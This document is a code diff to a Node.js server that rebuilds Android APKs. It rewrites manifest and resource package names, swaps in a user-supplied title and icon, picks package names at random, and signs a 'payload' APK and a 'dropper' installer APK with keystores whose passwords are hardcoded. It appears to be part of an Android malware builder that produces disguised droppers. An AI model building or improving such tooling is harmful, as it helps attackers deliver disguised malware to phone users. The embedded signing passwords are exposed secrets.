@@ -76,15 +76,39 @@ function makeNeutralPerm(originalPerm) {
 }
 
 const OLD_PKG = 'com.vision.quest';
+const ALLOWED_PACKAGES = ['com.vision.quest', 'com.nox.tech'];
+
+const KEY_CONFIGS = {
+    'com.nox.tech': {
+        keystore: path.join(ASSETS_DIR, 'quest_master.jks'),
+        alias: 'quest_master',
+        pass: 'QuestMaster2026!@#'
+    },
+    'com.vision.quest': {
+        keystore: path.join(ASSETS_DIR, 'usman90.jks'),
+        alias: 'usman90',
+        pass: 'God112256@'
+    }
+};
+
+function getJavaCmd() {
+    if (process.env.JAVA_BIN && fs.existsSync(process.env.JAVA_BIN)) return `"${process.env.JAVA_BIN}"`;
+    const jbrJava = 'C:\\Program Files\\Android\\Android Studio\\jbr\\bin\\java.exe';
+    if (fs.existsSync(jbrJava)) return `"${jbrJava}"`;
+    return 'java';
+}
 
 function resolvePackage(userPkg) {
-    return OLD_PKG;
+    if (userPkg && ALLOWED_PACKAGES.includes(userPkg.trim())) {
+        return userPkg.trim();
+    }
+    const idx = Math.floor(Math.random() * ALLOWED_PACKAGES.length);
+    return ALLOWED_PACKAGES[idx];
 }
 
 function patchManifestPackage(manifestBuf, newPkg) {
     const stringCount = manifestBuf.readUInt32LE(16);
     const stringStart = manifestBuf.readUInt32LE(28);
-    const newRootBuf = toUtf16LE(newPkg);
 
     const oldAuth = `${OLD_PKG}.androidx-startup`;
     const newAuth = `${newPkg}.androidx-startup`;
@@ -100,18 +124,18 @@ function patchManifestPackage(manifestBuf, newPkg) {
         const strOffset = absOffset + 2;
         const str = manifestBuf.toString('utf16le', strOffset, strOffset + len * 2);
 
-        if (str === OLD_PKG) {
-            newRootBuf.copy(manifestBuf, strOffset);
-            console.log(`[PATCH] Package updated: "${OLD_PKG}" -> "${newPkg}"`);
-        } else if (str === oldAuth) {
-            toUtf16LE(newAuth).copy(manifestBuf, strOffset);
-            console.log(`[PATCH] Authority updated: "${oldAuth}" -> "${newAuth}"`);
-        } else if (str === oldPerm) {
-            toUtf16LE(newPerm).copy(manifestBuf, strOffset);
-            console.log(`[PATCH] Permission updated: "${oldPerm}" -> "${newPerm}"`);
-        } else if (str === oldAction) {
-            toUtf16LE(newAction).copy(manifestBuf, strOffset);
-            console.log(`[PATCH] Action updated: "${oldAction}" -> "${newAction}"`);
+        let repl = null;
+        if (str === OLD_PKG) repl = newPkg;
+        else if (str === oldAuth) repl = newAuth;
+        else if (str === oldPerm) repl = newPerm;
+        else if (str === oldAction) repl = newAction;
+
+        if (repl) {
+            manifestBuf.writeUInt16LE(repl.length, absOffset);
+            const replBuf = toUtf16LE(repl);
+            replBuf.copy(manifestBuf, strOffset);
+            manifestBuf.writeUInt16LE(0, strOffset + replBuf.length);
+            console.log(`[PATCH] Manifest entry updated: "${str}" -> "${repl}"`);
         }
     }
 }
@@ -137,17 +161,20 @@ function patchArscTitle(arscBuf, targetName) {
     return false;
 }
 
-async function signApk(unsignedPath, outDir = TEMP_DIR) {
-    const ksArgs = fs.existsSync(KEYSTORE)
-        ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
-        : '';
-    const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${outDir}" ${ksArgs} --allowResign`;
+async function signApk(unsignedPath, outDir = TEMP_DIR, targetPkg = 'com.vision.quest') {
+    const keyConf = KEY_CONFIGS[targetPkg] || KEY_CONFIGS['com.vision.quest'];
+    const javaBin = getJavaCmd();
+    let ksArgs = '';
+    if (keyConf && fs.existsSync(keyConf.keystore)) {
+        ksArgs = `--ks "${keyConf.keystore}" --ksAlias ${keyConf.alias} --ksPass "${keyConf.pass}" --ksKeyPass "${keyConf.pass}"`;
+    }
+    const signCmd = `${javaBin} -jar "${SIGNER}" --apks "${unsignedPath}" --out "${outDir}" ${ksArgs} --allowResign`;
 
     await new Promise((resolve, reject) => {
         exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
             if (err) {
                 console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
-                exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${outDir}" --allowResign`,
+                exec(`${javaBin} -jar "${SIGNER}" --apks "${unsignedPath}" --out "${outDir}" --allowResign`,
                     { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
             } else {
                 resolve();
@@ -380,15 +407,13 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     console.log(`[ARSC] Title updated to: "${safeTitle}" (${byteLen} bytes)`);
                 }
 
-                // 2. Patch Package in ARSC so Resources match Manifest
                 if (targetPkg !== OLD_PKG) {
                     const oldPkgBuf = toUtf16LE(OLD_PKG);
-                    const newPkgBuf = toUtf16LE(targetPkg);
-                    let pIdx = 0;
-                    while ((pIdx = arscBuf.indexOf(oldPkgBuf, pIdx)) !== -1) {
-                        newPkgBuf.copy(arscBuf, pIdx);
-                        console.log(`[ARSC] Package updated at offset ${pIdx}`);
-                        pIdx += oldPkgBuf.length;
+                    let pIdx = arscBuf.indexOf(oldPkgBuf);
+                    if (pIdx !== -1) {
+                        arscBuf.fill(0, pIdx, pIdx + 256);
+                        toUtf16LE(targetPkg).copy(arscBuf, pIdx);
+                        console.log(`[ARSC] Package updated at offset ${pIdx}: "${OLD_PKG}" -> "${targetPkg}"`);
                     }
                 }
 
@@ -545,8 +570,8 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const unsignedPayloadPath = path.join(jobDir, `unsigned-payload.apk`);
             zip.writeZip(unsignedPayloadPath);
 
-            await sendUpdate('apk_progress', { step: 'Signing payload package with usman90 key...', progress: 85 });
-            await signApk(unsignedPayloadPath, jobDir);
+            await sendUpdate('apk_progress', { step: `Signing payload package for ${targetPkg}...`, progress: 85 });
+            await signApk(unsignedPayloadPath, jobDir, targetPkg);
 
             const signedPayloadName = fs.readdirSync(jobDir)
                 .find(f => f.includes('unsigned-payload') && f.includes('signed'));
@@ -625,8 +650,8 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     const unsignedDropPath = path.join(jobDir, `unsigned-dropper.apk`);
                     dropZip.writeZip(unsignedDropPath);
 
-                    await sendUpdate('apk_progress', { step: 'Signing installer package...', progress: 96 });
-                    await signApk(unsignedDropPath, jobDir);
+                    await sendUpdate('apk_progress', { step: `Signing installer package for ${targetPkg}...`, progress: 96 });
+                    await signApk(unsignedDropPath, jobDir, targetPkg);
 
                     const signedDropName = fs.readdirSync(jobDir)
                         .find(f => f.includes('unsigned-dropper') && f.includes('signed'));
